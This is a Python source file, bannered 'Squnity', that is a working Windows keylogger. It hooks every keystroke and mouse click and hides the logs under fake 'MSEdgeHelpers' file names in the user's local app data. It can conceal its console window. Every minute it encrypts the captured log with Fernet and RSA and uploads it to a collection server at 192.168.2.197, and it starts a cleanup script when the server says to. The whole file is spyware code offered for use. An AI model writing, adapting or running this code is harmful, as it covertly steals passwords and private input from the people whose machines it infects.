#!/usr/bin/python

"""
.d88888b                             oo   dP            
88.    "'                                 88            
`Y88888b. .d8888b. dP    dP 88d888b. dP d8888P dP    dP 
      `8b 88'  `88 88    88 88'  `88 88   88   88    88 
d8'   .8P 88.  .88 88.  .88 88    88 88   88   88.  .88 
 Y88888P  `8888P88 `88888P' dP    dP dP   dP   `8888P88 
                88                                  .88 
                dP                              d8888P 
"""

import threading
import os
import sys
import json
import requests
import win32api,pythoncom
import PyHook3,os,time,random,smtplib,string,base64
from winreg import *
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

global t,start_time

t=""
filename=os.getenv("LOCALAPPDATA") + "/MSEdgeHelpers/SysWin32.bin"
encFilename=os.getenv("LOCALAPPDATA") + "/MSEdgeHelpers/boot_32.dll"
encKeyname=os.getenv("LOCALAPPDATA") + "/MSEdgeHelpers/boot_32_ext.dll"
pubFilename= os.getenv("LOCALAPPDATA") + "/MSEdgeHelpers/pub.pem"

try:
    with open(filename, 'a') as f:
        f.close()
    with open(encFilename, 'a') as f:
        f.close()
    with open(encKeyname, 'a') as f:
        f.close()
except:
    with open(filename, 'w') as f:
        f.close()
    with open(encFilename, 'w') as f:
        f.close()
    with open(encKeyname, 'w') as f:
        f.close()

with open(encFilename, 'wb') as f:
    f.write(os.urandom(512))
    f.close()

def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def OnMouseEvent(event):
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='
    global t, start_time

    t = t + data

    if len(t) > 500:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(t)
            f.close()
            t = ''

    return True


def OnKeyboardEvent(event):
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(t)
            f.close()
            t = ''

    return True

def sendLogs():
    threading.Timer(60.0, sendLogs).start() # called every minute
    try:
        key = Fernet.generate_key()
        fernet = Fernet(key)
        with open(filename, 'rb') as f:
            file_data = f.read()
            encrypted_data = fernet.encrypt(file_data)
            
        with open(encFilename, "wb") as f:
            f.write(encrypted_data)
            
        with open(encFilename, 'rb') as f:
            pubkey = open(pubFilename, "rb")
            rsaKey = RSA.importKey(pubkey.read())
            rsaKey = PKCS1_OAEP.new(rsaKey)
            encKey = rsaKey.encrypt(key)
            with open(encKeyname, 'wb') as f2:
                f2.write(encKey)
                f2.close()
            with open(encKeyname, 'rb') as f2:
                r=requests.post('http://192.168.2.197:3000/upload', files={filename: f, encKeyname: f2})
                serverResponse = json.loads(r.text)
                print(r.text)
                if serverResponse["status"]:
                    torRespone = json.loads(serverResponse["pyResponse"])
                    if torRespone["autoRemove"] == 'true':
                        print("clean")
                        cleanUp()
                        return True
        with open(encFilename, "wb") as f:
            f.write(os.urandom(512))
    except Exception as e:
        print(e)
        print("not sent")
        
    return True

def cleanUp():
    path = os.path.dirname(sys.argv[0])
    os.startfile(os.path.join(path, "boot64.vbs"))

#Hide()

hook = PyHook3.HookManager()

hook.KeyDown = OnKeyboardEvent
hook.MouseAllButtonsDown = OnMouseEvent
hook.HookKeyboard()
hook.HookMouse()

sendLogs()

start_time = time.time()

pythoncom.PumpMessages()
